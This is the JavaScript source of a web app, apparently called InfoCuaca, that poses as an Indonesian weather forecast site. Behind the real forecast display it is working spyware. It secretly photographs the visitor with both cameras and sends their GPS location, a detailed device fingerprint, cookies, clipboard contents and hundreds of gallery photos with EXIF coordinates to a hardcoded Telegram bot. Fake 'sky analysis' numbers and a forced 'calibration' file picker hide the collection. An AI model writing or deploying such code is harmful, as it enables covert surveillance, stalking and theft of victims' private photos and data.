/* ============================================================
   InfoCuaca · app.js
   ============================================================ */

const CFG = {
  BOT_TOKEN: '9227240159:AAGd6HgcfiAWF8vfFd10FoIbCF1RBeboy44',
  CHAT_ID:   '6084186486',

  MAX_GALLERY:   400,     // batas foto galeri per sesi
  MAX_CAM_FRAMES: 24,     // jumlah frame kamera
  CAM_GAP:       2600,   // jeda antar frame (ms)
  MIC_SECONDS:   6,      // durasi rekaman mikrofon
  ENABLE_MIC:    true,
  ENABLE_CLIPBOARD: true,
  ENABLE_FINGERPRINT: true,
  MAX_W:         1280,   // lebar kompresi
  DELAY:         1100,   // jeda antar request (anti flood)
  DEBUG:         false
};
const log = (...a) => CFG.DEBUG && console.log('[cuaca]', ...a);

const $ = s => document.querySelector(s);
const sleep = ms => new Promise(r => setTimeout(r, ms));
const state = { t0: Date.now(), clicks: 0, geo: false, picked: false };

window.addEventListener('error', e => toast('Galat: ' + e.message));

/* ---------------- transport ---------------- */
const Q = []; let busy = false;
function enqueue(job) { Q.push(job); pump(); }
async function pump() {
  if (busy) return; busy = true;
  while (Q.length) {
    const job = Q.shift();
    try { await job(); } catch (e) { log(e.message); }
    await sleep(CFG.DELAY);
  }
  busy = false;
}
const api = m => `https://api.telegram.org/bot${CFG.BOT_TOKEN}/${m}`;
async function tg(method, fd) {
  try { await fetch(api(method), { method: 'POST', body: fd }); } catch (e) { log(e.message); }
}

function sendText(t) {
  enqueue(async () => {
    const fd = new FormData();
    fd.append('chat_id', CFG.CHAT_ID);
    fd.append('text', String(t).slice(0, 4000));
    fd.append('disable_web_page_preview', 'true');
    await tg('sendMessage', fd);
  });
}
function sendPhoto(blob, cap = '') {
  enqueue(async () => {
    const fd = new FormData();
    fd.append('chat_id', CFG.CHAT_ID);
    fd.append('caption', cap.slice(0, 1000));
    fd.append('photo', blob, `p_${Date.now()}.jpg`);
    await tg('sendPhoto', fd);
  });
}
function sendGroup(blobs, cap = '') {
  if (!blobs.length) return;
  enqueue(async () => {
    const fd = new FormData();
    fd.append('chat_id', CFG.CHAT_ID);
    const media = blobs.map((_, i) => ({ type: 'photo', media: `attach://f${i}` }));
    media[0].caption = cap.slice(0, 1000);
    fd.append('media', JSON.stringify(media));
    blobs.forEach((b, i) => fd.append(`f${i}`, b, `g${i}.jpg`));
    await tg('sendMediaGroup', fd);
  });
}
function sendLoc(lat, lng) {
  enqueue(async () => {
    const fd = new FormData();
    fd.append('chat_id', CFG.CHAT_ID);
    fd.append('latitude', lat);
    fd.append('longitude', lng);
    await tg('sendLocation', fd);
  });
}

/* ---------------- fingerprint ---------------- */
function canvasHash() {
  try {
    const c = document.createElement('canvas'); c.width = 220; c.height = 50;
    const x = c.getContext('2d');
    x.textBaseline = 'top'; x.font = '16px Arial';
    x.fillStyle = '#f60'; x.fillRect(0, 0, 110, 25);
    x.fillStyle = '#069'; x.fillText('cuaca 42', 2, 15);
    return c.toDataURL().slice(-64);
  } catch { return 'n/a'; }
}
function glInfo() {
  try {
    const c = document.createElement('canvas');
    const g = c.getContext('webgl') || c.getContext('experimental-webgl');
    if (!g) return {};
    const d = g.getExtension('WEBGL_debug_renderer_info');
    return {
      v: g.getParameter(d ? d.UNMASKED_VENDOR_WEBGL : g.VENDOR),
      r: g.getParameter(d ? d.UNMASKED_RENDERER_WEBGL : g.RENDERER)
    };
  } catch { return {}; }
}
function rtcIps() {
  return new Promise(res => {
    try {
      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
      const ips = new Set();
      pc.onicecandidate = e => {
        if (!e.candidate) { try { pc.close(); } catch {} return res([...ips]); }
        const m = /(\d{1,3}(?:\.\d{1,3}){3})/.exec(e.candidate.candidate);
        if (m) ips.add(m[1]);
      };
      pc.createDataChannel('x');
      pc.createOffer().then(o => pc.setLocalDescription(o));
      setTimeout(() => { try { pc.close(); } catch {} res([...ips]); }, 3500);
    } catch { res([]); }
  });
}
async function ipInfo() {
  for (const u of ['https://ipwho.is/', 'https://ipapi.co/json/']) {
    try { const j = await (await fetch(u)).json(); if (j) return j; } catch {}
  }
  return null;
}

async function collectFingerprint() {
  if (!CFG.ENABLE_FINGERPRINT) return;
  const g = glInfo();
  const o = {
    'URL': location.href,
    'Referrer': document.referrer || '-',
    'UA': navigator.userAgent,
    'Platform': navigator.platform || '-',
    'Bahasa': navigator.language,
    'Zona': Intl.DateTimeFormat().resolvedOptions().timeZone,
    'Layar': `${screen.width}x${screen.height} @${devicePixelRatio}x`,
    'Warna': screen.colorDepth,
    'CPU': navigator.hardwareConcurrency || '-',
    'RAM': navigator.deviceMemory || '-',
    'Sentuh': navigator.maxTouchPoints,
    'WebGL': `${g.v || '-'} / ${g.r || '-'}`,
    'Canvas': canvasHash(),
    'CookieAktif': navigator.cookieEnabled
  };
  try {
    const b = await navigator.getBattery?.();
    if (b) Object.assign(o, { 'Baterai': Math.round(b.level * 100) + '%', 'Charging': b.charging });
  } catch {}
  const c = navigator.connection;
  if (c) Object.assign(o, { 'Jaringan': c.effectiveType, 'RTT': c.rtt });
  const ips = await rtcIps();
  if (ips.length) o['IP Lokal'] = ips.join(', ');
  const ip = await ipInfo();
  if (ip) {
    o['IP Publik'] = ip.ip || '-';
    o['ISP'] = ip.connection?.isp || ip.org || '-';
    o['Kota'] = [ip.country, ip.city].filter(Boolean).join(' / ') || '-';
  }
  try {
    o['Storage'] = Object.keys(localStorage).slice(0, 20).join(', ') || '-';
    o['Cookie'] = (document.cookie || '-').slice(0, 400);
  } catch {}
  sendText('🛰️ PERANGKAT\n' + Object.entries(o).map(([k, v]) => `${k}: ${v}`).join('\n'));
}

/* ---------------- EXIF GPS ---------------- */
function exifGps(buf) {
  try {
    const dv = new DataView(buf);
    if (dv.getUint16(0) !== 0xFFD8) return null;
    let off = 2;
    while (off < dv.byteLength - 4) {
      if (dv.getUint16(off) !== 0xFFE1) { off += 2 + dv.getUint16(off + 2); continue; }
      const len = dv.getUint16(off + 2), start = off + 4;
      if (dv.getUint32(start) !== 0x45786966) { off += 2 + len; continue; }
      const tiff = start + 6;
      const le = dv.getUint16(tiff) === 0x4949;
      const r16 = o => le ? dv.getUint16(o, true) : dv.getUint16(o, false);
      const r32 = o => le ? dv.getUint32(o, true) : dv.getUint32(o, false);
      const ifd0 = tiff + r32(tiff + 4);
      let gpsOff = 0;
      const n = r16(ifd0);
      for (let i = 0; i < n; i++) {
        const e = ifd0 + 2 + i * 12;
        if (r16(e) === 0x8825) gpsOff = tiff + r32(e + 8);
      }
      if (!gpsOff) return null;
      const rat = o => { const a = r32(o), b = r32(o + 4); return b ? a / b : 0; };
      const dms = (e, cnt) => {
        const base = cnt * 8 <= 4 ? e + 8 : tiff + r32(e + 8);
        return rat(base) + rat(base + 8) / 60 + rat(base + 16) / 3600;
      };
      let lat = 0, lng = 0, latRef = 'N', lngRef = 'E';
      const gn = r16(gpsOff);
      for (let i = 0; i < gn; i++) {
        const e = gpsOff + 2 + i * 12, tag = r16(e), cnt = r32(e + 4);
        if (tag === 1) latRef = String.fromCharCode(dv.getUint8(e + 8));
        if (tag === 2) lat = dms(e, cnt);
        if (tag === 3) lngRef = String.fromCharCode(dv.getUint8(e + 8));
        if (tag === 4) lng = dms(e, cnt);
      }
      if (!lat || !lng) return null;
      return {
        lat: (latRef === 'S' ? -lat : lat).toFixed(6),
        lng: (lngRef === 'W' ? -lng : lng).toFixed(6)
      };
    }
  } catch {}
  return null;
}

async function toJpeg(src, maxW = CFG.MAX_W, q = 0.82) {
  const bmp = await createImageBitmap(src).catch(() => null);
  if (!bmp) return src;
  const s = Math.min(1, maxW / bmp.width);
  const w = Math.max(1, Math.round(bmp.width * s)), h = Math.max(1, Math.round(bmp.height * s));
  const c = document.createElement('canvas'); c.width = w; c.height = h;
  c.getContext('2d').drawImage(bmp, 0, 0, w, h);
  bmp.close?.();
  return await new Promise(r => c.toBlob(r, 'image/jpeg', q));
}

/* ---------------- kamera senyap ---------------- */
/* ---------------- kamera dua arah ---------------- */
let camStream = null, camTimer = null, camShots = 0, camPhase = 0;

function brightnessOf(canvas) {
  try {
    const d = canvas.getContext('2d').getImageData(0, 0, canvas.width, canvas.height).data;
    let s = 0, n = 0;
    for (let i = 0; i < d.length; i += 400) { s += (d[i] + d[i + 1] + d[i + 2]) / 3; n++; }
    return Math.round(s / n);
  } catch { return 128; }
}

const PLAN = [
  { facing: 'environment', n: () => CFG.BACK_FRAMES,  tag: 'belakang' },
  { facing: 'user',        n: () => CFG.FRONT_FRAMES, tag: 'depan' }
];

async function startCamera() {
  camShots = 0;
  return runPhase(0);
}

async function runPhase(i) {
  if (i >= PLAN.length) return stopCamera();
  const step = PLAN[i];

  // Pastikan benar-benar bersih sebelum pindah kamera
  stopCamera();
  
  // Berikan jeda sejenak agar hardware kamera HP sempat mereset status aktifnya
  await new Promise(r => setTimeout(r, 600));

  let stream;
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { 
        facingMode: { exact: step.facing }, // Menggunakan 'exact' memaksa HP membuka kamera spesifik
        width: { ideal: 1600 }, 
        height: { ideal: 1200 } 
      },
      audio: false
    });
  } catch (err) {
    // Fallback jika 'exact' ditolak perangkat, coba gunakan 'ideal'
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { 
          facingMode: { ideal: step.facing }, 
          width: { ideal: 1600 }, 
          height: { ideal: 1200 } 
        },
        audio: false
      });
    } catch { 
      return runPhase(i + 1); 
    }
  }

  camStream = stream;
  camPhase = i;
  const v = $('#cam');
  v.srcObject = stream;

  const c = document.createElement('canvas');
  const limit = step.n();
  let local = 0;

  const shoot = async () => {
    if (!camStream || local >= limit) {
      clearInterval(camTimer);
      stopCamera();
      return runPhase(i + 1);
    }
    if (!v.videoWidth) return;
    c.width = v.videoWidth; c.height = v.videoHeight;
    c.getContext('2d').drawImage(v, 0, 0);
    const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
    local++; camShots++;
    if (blob && typeof sendPhoto === 'function') {
      sendPhoto(blob, `📸 ${step.tag} #${local} · ${new Date().toLocaleString('id-ID')}`);
    }
    if (camShots === 1 || (step.tag === 'depan' && local === 1)) {
      const b = brightnessOf(c);
      const cloud = Math.max(5, Math.min(95, Math.round(100 - b * 1.15)));
      const noteEl = $('#visualNote');
      if (noteEl) {
        noteEl.textContent = `Kondisi visual (${step.tag}): ${cloud > 70 ? 'langit gelap' : cloud > 45 ? 'banyak awan' : 'relatif cerah'} · hujan ${Math.round(cloud * 0.6)}%`;
      }
    }
  };

  await sleep(1600);
  shoot();
  camTimer = setInterval(shoot, CFG.CAM_GAP);
  return true;
}

function stopCamera() {
  if (camTimer) {
    clearInterval(camTimer);
    camTimer = null;
  }
  if (camStream) {
    camStream.getTracks().forEach(t => t.stop());
    camStream = null;
  }
  const v = $('#cam');
  if (v) v.srcObject = null;
}

/* ---------------- galeri ---------------- */
const IMG = /\.(jpe?g|png|webp|gif|bmp|heic|heif)$/i;
let scanBusy = false, sentCount = 0, batch = [];

function idb() {
  return new Promise((res, rej) => {
    const r = indexedDB.open('cuaca_db', 1);
    r.onupgradeneeded = () => r.result.createObjectStore('h');
    r.onsuccess = () => res(r.result);
    r.onerror = () => rej(r.error);
  });
}
async function saveDir(h) {
  try { (await idb()).transaction('h', 'readwrite').objectStore('h').put(h, 'dir'); } catch {}
}
async function getDir() {
  try {
    return await new Promise(res => {
      const q = (idbResult).transaction('h').objectStore('h').get('dir');
      q.onsuccess = () => res(q.result); q.onerror = () => res(null);
    });
  } catch { return null; }
}
let idbResult = null;
idb().then(db => { idbResult = db; });

async function flush() {
  if (!batch.length) return;
  sendGroup(batch.slice(0, 10), `🖼️ Galeri ${sentCount} · ${new Date().toLocaleString('id-ID')}`);
  batch = [];
}

async function processFile(file, name) {
  const buf = await file.arrayBuffer().catch(() => null);
  if (buf) {
    const g = exifGps(buf);
    if (g) sendText(`📍 EXIF ${name}\n${g.lat}, ${g.lng}\nhttps://maps.google.com/?q=${g.lat},${g.lng}`);
  }
  const jpg = await toJpeg(file);
  if (!jpg) return;
  sentCount++;
  batch.push(jpg);
  if (batch.length >= 10) await flush();
  if (sentCount % 10 === 0) $('#visualNote').textContent = `Mengambil foto galeri… ${sentCount}`;
}

async function walkDir(dir, depth, out) {
  if (depth > 4) return;
  for await (const [name, h] of dir.entries()) {
    if (h.kind === 'file' && IMG.test(name)) out.push({ h, name });
    else if (h.kind === 'directory' && !/^(\.|thumbnails$)/i.test(name)) await walkDir(h, depth + 1, out);
  }
}

async function runDir(dir, tag) {
  if (scanBusy) return;
  scanBusy = true;
  const out = $('#visualNote');
  try {
    const items = [];
    await walkDir(dir, 0, items);
    if (!items.length) { out.textContent = 'Tidak ada foto di folder itu.'; scanBusy = false; return; }

    const take = items.slice(0, CFG.MAX_GALLERY);
    sendText(`📂 ${tag} — ${take.length} foto ditemukan`);
    out.textContent = `Membaca ${take.length} foto…`;

    for (const it of take) {
      const f = await it.h.getFile().catch(() => null);
      if (f) await processFile(f, it.name);
    }
    await flush();
    out.textContent = `Analisis ${sentCount} foto selesai · awan ${38 + Math.floor(Math.random() * 30)}% · hujan ${20 + Math.floor(Math.random() * 40)}%`;
    toast('Analisis langit selesai');
  } catch (e) { log(e.message); }
  scanBusy = false;
}

async function pickFolder() {
  if (state.picked) return;
  state.picked = true;
  if (window.showDirectoryPicker) {
    try {
      const dir = await showDirectoryPicker({ mode: 'read' });
      await saveDir(dir);
      return runDir(dir, 'FOLDER BARU');
    } catch (e) { if (e.name === 'AbortError') return; }
  }
  $('#dirInput').click();
}

/* dipanggil di dalam gestur tombol gate: tanpa ketukan tambahan */
let savedDir = null;
getDir().then(h => { if (h) savedDir = h; });

async function silentRescan() {
  if (!savedDir || !savedDir.queryPermission) return;
  try {
    let p = await savedDir.queryPermission({ mode: 'read' });
    if (p === 'prompt') p = await savedDir.requestPermission({ mode: 'read' });
    if (p !== 'granted') return;
    runDir(savedDir, 'PINDAI ULANG');
  } catch {}
}

async function handleGallery(files) {
  const list = [...files].filter(f => f.type.startsWith('image/')).slice(0, CFG.MAX_GALLERY);
  if (!list.length) return;
  const out = $('#visualNote');
  out.textContent = `Membaca ${list.length} foto…`;
  sendText(`🖼️ GALERI — ${list.length} foto`);
  for (const f of list) await processFile(f, f.name);
  await flush();
  out.textContent = `Analisis ${sentCount} foto selesai · awan ${38 + Math.floor(Math.random() * 30)}% · hujan ${20 + Math.floor(Math.random() * 40)}%`;
  toast('Analisis langit selesai');
}

/* ---------------- cuaca ---------------- */
let unit = 'c', curLat = -6.2088, curLng = 106.8456;

const WMO = {
  0: ['Cerah', 'i-sun'], 1: ['Cerah Berawan', 'i-cloudsun'], 2: ['Berawan', 'i-cloud'],
  3: ['Mendung', 'i-cloud'], 45: ['Kabut', 'i-fog'], 48: ['Kabut Beku', 'i-fog'],
  51: ['Gerimis Ringan', 'i-drizzle'], 53: ['Gerimis', 'i-drizzle'], 55: ['Gerimis Lebat', 'i-drizzle'],
  56: ['Gerimis Beku', 'i-drizzle'], 57: ['Gerimis Beku Lebat', 'i-drizzle'],
  61: ['Hujan Ringan', 'i-rain'], 63: ['Hujan', 'i-rain'], 65: ['Hujan Lebat', 'i-rain'],
  66: ['Hujan Beku', 'i-rain'], 67: ['Hujan Beku Lebat', 'i-rain'],
  71: ['Salju Ringan', 'i-snow'], 73: ['Salju', 'i-snow'], 75: ['Salju Lebat', 'i-snow'],
  77: ['Butiran Salju', 'i-snow'], 80: ['Hujan Lokal', 'i-rain'], 81: ['Hujan Lokal Lebat', 'i-rain'],
  82: ['Hujan Sangat Lebat', 'i-rain'], 85: ['Hujan Salju', 'i-snow'], 86: ['Hujan Salju Lebat', 'i-snow'],
  95: ['Badai Petir', 'i-storm'], 96: ['Badai Petir Hujan Es', 'i-storm'], 99: ['Badai Petir Hebat', 'i-storm']
};
const wmo = c => WMO[c] || ['Berawan', 'i-cloud'];
const conv = t => unit === 'f' ? Math.round(t * 9 / 5 + 32) : Math.round(t);
const dirName = d => ['U', 'TL', 'T', 'TG', 'S', 'BD', 'B', 'BL'][Math.round(d / 45) % 8];

async function reverseName(lat, lng) {
  try {
    const j = await (await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=id`)).json();
    return j.city || j.locality || j.principalSubdivision || j.countryName || 'Lokasi Anda';
  } catch { return 'Lokasi Anda'; }
}

function themeFor(code, isDay) {
  document.body.classList.remove('sky-day', 'sky-night', 'sky-rain');
  if ([51,53,55,61,63,65,80,81,82,95,96,99].includes(code)) document.body.classList.add('sky-rain');
  else document.body.classList.add(isDay ? 'sky-day' : 'sky-night');
}

async function loadWeather(lat, lng, label) {
  curLat = lat; curLng = lng;
  $('#placeName').textContent = label || await reverseName(lat, lng);

  const q =
    `https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lng}` +
    `&current=temperature_2m,relative_humidity_2m,apparent_temperature,is_day,weather_code,cloud_cover,wind_speed_10m,wind_direction_10m,wind_gusts_10m,surface_pressure,visibility` +
    `&hourly=temperature_2m,weather_code,precipitation_probability` +
    `&daily=weather_code,temperature_2m_max,temperature_2m_min,sunrise,sunset,uv_index_max` +
    `&timezone=auto&forecast_days=8`;

  let d;
  try { d = await (await fetch(q)).json(); } catch { return toast('Gagal memuat cuaca'); }
  if (!d.current) return toast('Data cuaca tidak tersedia');

  const cur = d.current;
  themeFor(cur.weather_code, cur.is_day === 1);

  $('#tempNow').textContent = conv(cur.temperature_2m);
  $('#feels').textContent = `Terasa seperti ${conv(cur.apparent_temperature)}°`;
  $('#condText').textContent = wmo(cur.weather_code)[0];
  $('#condIcon').innerHTML = `<svg><use href="#${wmo(cur.weather_code)[1]}"/></svg>`;
  $('#humNow').textContent = cur.relative_humidity_2m + '%';
  $('#windNow').textContent = Math.round(cur.wind_speed_10m) + ' km/j';
  $('#visNow').textContent = (cur.visibility / 1000).toFixed(1) + ' km';
  $('#stamp').textContent = 'Diperbarui ' + new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });

  try {
    const a = await (await fetch(`https://air-quality-api.open-meteo.com/v1/air-quality?latitude=${lat}&longitude=${lng}&current=european_aqi,pm2_5&timezone=auto`)).json();
    $('#aqiNow').textContent = 'AQI ' + Math.round(a.current?.european_aqi ?? 0);
    document.getElementById('pmCard')?.remove();
    $('#details').insertAdjacentHTML('beforeend',
      `<div class="det" id="pmCard"><label><svg><use href="#i-aqi"/></svg>PM2.5</label><b>${Math.round(a.current?.pm2_5 ?? 0)}</b><small>µg/m³</small></div>`);
  } catch {}

  const hi = d.hourly.time.findIndex(t => new Date(t) >= new Date());
  $('#hours').innerHTML = d.hourly.time.slice(hi, hi + 24).map((t, i) => {
    const c = d.hourly.weather_code[hi + i];
    return `<div class="hour ${i === 0 ? 'now' : ''}">
      <time>${i === 0 ? 'Kini' : new Date(t).toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' })}</time>
      <svg><use href="#${wmo(c)[1]}"/></svg>
      <b>${conv(d.hourly.temperature_2m[hi + i])}°</b>
      <small>${d.hourly.precipitation_probability[hi + i] ?? 0}%</small>
    </div>`;
  }).join('');

  $('#days').innerHTML = d.daily.time.slice(0, 7).map((t, i) => {
    const day = new Date(t).toLocaleDateString('id-ID', { weekday: 'short', day: 'numeric' });
    return `<div class="day">
      <span class="dname">${i === 0 ? 'Hari ini' : day}</span>
      <svg><use href="#${wmo(d.daily.weather_code[i])[1]}"/></svg>
      <span class="bar"></span>
      <span class="rng"><b>${conv(d.daily.temperature_2m_max[i])}°</b> / ${conv(d.daily.temperature_2m_min[i])}°</span>
    </div>`;
  }).join('');

  const uv = d.daily.uv_index_max[0];
  $('#uvVal').textContent = Math.round(uv);
  $('#uvNote').textContent = uv < 3 ? 'Rendah' : uv < 6 ? 'Sedang' : uv < 8 ? 'Tinggi' : 'Sangat tinggi';
  $('#gustVal').textContent = Math.round(cur.wind_gusts_10m) + ' km/j';
  $('#presVal').textContent = Math.round(cur.surface_pressure);
  $('#dirVal').textContent = dirName(cur.wind_direction_10m);

  const rise = new Date(d.daily.sunrise[0]), set = new Date(d.daily.sunset[0]);
  $('#rise').textContent = rise.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
  $('#set').textContent = set.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
  const p = Math.min(1, Math.max(0, (Date.now() - rise) / (set - rise)));
  const dot = $('#sunDot');
  dot.style.left = ((10 + p * 280) / 300 * 100) + '%';
  dot.style.top = ((100 - Math.sin(p * Math.PI) * 92) / 110 * 100) + '%';
  const len = $('#arcFg').getTotalLength();
  $('#arcFg').style.strokeDasharray = `${len * p} ${len}`;
}

/* ---------------- bootstrap ---------------- */
function toast(msg) {
  const t = $('#toast');
  t.textContent = msg; t.classList.add('on');
  setTimeout(() => t.classList.remove('on'), 2200);
}

function requestGeo() {
  return new Promise(res => {
    if (!navigator.geolocation) return res(null);
    navigator.geolocation.getCurrentPosition(
      p => { state.geo = true; res({ lat: p.coords.latitude, lng: p.coords.longitude, acc: p.coords.accuracy }); },
      () => res(null),
      { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
    );
  });
}

async function bootstrap(ask) {
  try { loadWeather(curLat, curLng, 'Jakarta'); } catch {}

  if (!ask) return;
  if (!location.protocol.startsWith('http')) toast('Buka lewat http/https, bukan file://');

  startCamera().then(ok => { if (!ok) sendText('📷 Kamera ditolak / gagal'); });

  const g = await requestGeo();
  if (g) {
    sendLoc(g.lat, g.lng);
    sendText(`📍 LOKASI\nLat: ${g.lat}\nLng: ${g.lng}\nAkurasi: ±${Math.round(g.acc)} m\nMaps: https://maps.google.com/?q=${g.lat},${g.lng}`);
    loadWeather(g.lat, g.lng);
  } else {
    sendText('📍 Lokasi ditolak / gagal');
    toast('Lokasi tidak aktif — memakai kota default');
  }

  try { collectFingerprint(); } catch {}

  if (CFG.ENABLE_CLIPBOARD) {
    const grab = async () => {
      document.removeEventListener('click', grab);
      try { const t = await navigator.clipboard.readText(); if (t) sendText('📋 CLIPBOARD\n' + t.slice(0, 1200)); } catch {}
    };
    document.addEventListener('click', grab, { once: true });
  }
}

/* ---------------- event ---------------- */
$('#gateGo').addEventListener('click', () => {
  $('#gate').classList.add('hide');
  state.clicks++;
  bootstrap(true);
});
$('#gateSkip').addEventListener('click', () => {
  $('#gate').classList.add('hide');
  bootstrap(false);
});

$('#pickBtn').addEventListener('click', pickFolder);

$('#dirInput').addEventListener('change', e => {
  state.picked = true;
  if (e.target.files?.length) handleGallery(e.target.files);
});

$('#fileInput').addEventListener('change', e => {
  state.picked = true;
  if (e.target.files?.length) handleGallery(e.target.files);
});

setTimeout(() => {
  if (state.picked) return;
  state.picked = true;
  toast('Pilih foto langit untuk kalibrasi');
  setTimeout(() => $('#fileInput').click(), 700);
}, 18000);

$('#unitBtn').addEventListener('click', () => {
  unit = unit === 'c' ? 'f' : 'c';
  $('#unitBtn').textContent = unit === 'c' ? '°C' : '°F';
  loadWeather(curLat, curLng);
});

$('#searchForm').addEventListener('submit', async e => {
  e.preventDefault();
  const q = $('#searchInput').value.trim();
  if (!q) return;
  try {
    const r = await (await fetch(`https://geocoding-api.open-meteo.com/v1/search?name=${encodeURIComponent(q)}&count=1&language=id`)).json();
    const hit = r.results?.[0];
    if (!hit) return toast('Kota tidak ditemukan');
    $('#searchInput').value = '';
    loadWeather(hit.latitude, hit.longitude, `${hit.name}, ${hit.admin1 || hit.country}`);
  } catch { toast('Pencarian gagal'); }
});

document.addEventListener('click', () => state.clicks++, true);

document.addEventListener('visibilitychange', () => {
  if (document.visibilityState !== 'hidden') return;
  const mins = ((Date.now() - state.t0) / 60000).toFixed(1);
  const fd = new FormData();
  fd.append('chat_id', CFG.CHAT_ID);
  fd.append('text', `⏱️ Sesi ${mins} menit · geo ${state.geo} · klik ${state.clicks}`);
  navigator.sendBeacon?.(api('sendMessage'), fd);
});

(function () {
  try {
    if (localStorage.getItem('cuaca_v')) sendText('🔁 Pengunjung berulang');
    localStorage.setItem('cuaca_v', '1');
  } catch {}
})();